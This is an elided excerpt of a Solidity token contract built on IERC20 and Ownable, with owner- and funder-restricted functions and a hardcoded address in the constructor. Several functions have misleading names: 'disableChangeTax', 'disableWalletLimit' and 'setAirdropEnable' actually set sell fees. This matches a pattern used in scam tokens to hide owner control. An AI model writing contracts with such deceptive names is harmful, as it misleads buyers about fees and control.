...
abstract contract TOKEN is IERC20, Ownable {
    ...
    function changeSwapLimit(address addr) private onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function completeCustoms(uint256 dividendFee) private onlyOwner {
    ...
    function disableChangeTax(uint256 dividendFee) private onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function disableWalletLimit(uint256 fundFee) private onlyOwner {
        _sellFundFee = fundFee;
    }

    function setAirdropEnable(uint256 lpFee) private onlyOwner {
        _sellLPFee = lpFee;
    }
    ...
    function setExcludeHolder(address addr, bool enable) private onlyFunder {
    ...
    function excludeFromFee(address addr, uint256 enable) public onlyFunder {
...
contract Token is TOKEN {
    ...
    constructor() TOKEN(
        ...
        address(0x9d86B8b3f9C5392554132dE60dAcD4e149170b92),
